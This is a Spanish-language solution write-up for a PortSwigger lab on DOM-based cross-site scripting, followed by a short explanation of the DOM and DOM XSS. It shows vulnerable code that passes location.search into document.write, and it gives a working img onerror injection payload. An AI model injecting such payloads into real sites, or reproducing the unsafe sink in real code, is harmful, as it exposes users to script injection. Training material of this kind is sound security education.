# Lab: DOM XSS in `document.write` sink using source `location.search`

## Descripción: 
This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.
To solve this lab, perform a cross-site scripting attack that calls the `alert` function.

## Solución:

1. Ingresamos una cadena alfanumérica aleatoria en el cuadro de búsqueda.

![Pasted image 20230627143011](Pasted%20image%2020230627143011.png)

2. Haga clic derecho e inspeccione el elemento, y observe que su cadena aleatoria se ha colocado dentro de un atributo `img src` .

```html
<script>
        function trackSearch(query) {
            document.write('<img src="/resources/images/tracker.gif   searchTerms='+query+'">');
        }
        var query = (new URLSearchParams(window.location.search)).get('search');
        if(query) {
            trackSearch(query);
        }
</script>
```

3. Usamos el siguiente payload para comprobar si la pagina es vulnerable a XSS.  

```html
"><img src=x onerror=alert('XSS');>
```

![Pasted image 20230627144602](Pasted%20image%2020230627144602.png)

## Notas adicionales:

## ¿Qué es el XSS DOM?
Antes de aprender qué es el XSS DOM, **es necesario contar con una noción básica sobre qué es [DOM](https://keepcoding.io/blog/document-object-model/)**.
**El DOM o Document Object Model es una interfaz de programación de aplicaciones (API) que permite leer, acceder y modificar el _frontend_ del código fuente de una aplicación web**. El DOM representa archivos XML o HTML en una estructura de árbol, basada en la jerarquía de los objetos que componen la página web.

El XSS DOM o basado en DOM es aquel que se realiza **inyectando comandos de JavaScript en el DOM de una página web**. Una aplicación web vulnerable permite ejecutar código malicioso desde su _frontend_, debido a una falta de validación de los _inputs_ de un usuario.

Todas las aplicaciones pueden ser representadas por medio de un DOM, **al cual se puede acceder por medio de la versión para desarrolladores de la app**, que puede ser vista a través de cualquier navegador. Al igual que en el XSS reflejado, el _payload_ de un ataque con XSS DOM puede incrustarse en la dirección URL del sitio. Sin embargo, el fallo de seguridad para este tipo de XSS se halla específicamente en el DOM.

## Referencias:
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#cors